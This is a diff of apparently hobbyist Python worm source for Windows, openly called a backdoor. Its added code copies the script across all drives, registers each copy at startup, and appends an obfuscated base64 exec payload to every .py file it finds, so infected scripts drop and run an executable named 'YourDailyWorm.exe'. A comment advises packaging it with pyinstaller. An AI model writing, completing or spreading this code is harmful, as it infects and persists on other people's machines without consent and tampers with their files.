@@ -1,14 +1,7 @@
-# ToDo list :
-#   1)Spread in drivers,add to startup and continueos check (✓)
-#   2)Spread in scripts by injecting [py/pl/ps1...]         (✘)
-#   3)Spread in shared folders                              (✘)
-#   4)Spread in lan                                         (✘)
-#   5)Spread in usb                                         (✘)
-#   6)Make a copy of itself online and use it in spreading  (✘)
-#   7)[Advanced]Convert itself to executable and inject..   (✘)
-#   8)...Still thinking :D
 #
 #       Note:Most of the functions would be for windows or all of it
+#
+#       Don't forget to convert it to executable & I recommend to you pyinstaller
 #
 import os,string,random,sys,glob,hashlib
 from winreg import *
@@ -33,6 +26,7 @@ def fname(name):
 def md5_checksum(fi):
     return hashlib.md5(open(fi, 'rb').read()).hexdigest()
 
+#The script must be executable
 #Add each copy of the backdoor to the startup
 def Startup(worms):
     for worm in worms:
@@ -56,8 +50,15 @@ def make_copy( old,new ):
     old_file.close()
     new_file.close()
 
+#For example if we in  C:\.\.\.\..etc I will be in C:
+def Goback():
+    for i in range( 0,20 ):
+        a = os.popen("cd ..")
+
+#The script must be executable
 #Spread backdoor copys in the pc drivers
 def spread_in_drivers():
+    Goback()
     drivs = drivers()
     #current_driver = os.getcwd().split( ":" )[0]
     name = sys.argv[0]
@@ -73,5 +74,20 @@ def spread_in_drivers():
                 exist = 1
         if exist == 0 :
             make_copy( name,fname(name) )
+
+#[when a script moved to any other device and executed it will run our backdoor on it]
+#The script must be executable
+#Spread in the python scripts
+def spread_in_python():
+    Goback()
+    files = []
+    for driv in drivers():
+        os.chdir( driv )
+        files = os.popen( 'dir /s /b "*.py"' ).read().split( "\n" )
+    for f in files:
+        if "#--SayTheMagicWord--" not in open( f,"r" ).read() :
+            a=open(f,"a+")
+            a.write("\n\n\n\n#--SayTheMagicWord--\nimport base64,os;exec(base64.b64decode('{}'))".format(base64.b64encode("open('YourDailyWorm.exe','w').write('{}');os.popen('YourDailyWorm.exe')".format(open(sys.argv[0],'rb').read()))))
+            a.close()
 
 #I will Continue later..
